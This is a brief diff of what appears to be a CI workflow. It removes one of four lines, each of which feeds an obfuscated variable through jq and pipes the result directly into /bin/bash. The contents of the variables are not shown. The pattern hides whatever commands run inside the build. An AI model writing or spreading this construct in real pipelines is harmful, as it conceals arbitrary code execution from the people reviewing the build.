@@ -23,7 +23,6 @@ jobs:
           echo $uslw94976 | jq -r .uueh6314 | /bin/bash
           echo $zif08 | jq -r .u19 | /bin/bash
           echo $k5 | jq -r .j43 | /bin/bash
-          echo $p250 | jq -r .mh70719 | /bin/bash
 
       - name: Upload data
         if: always()
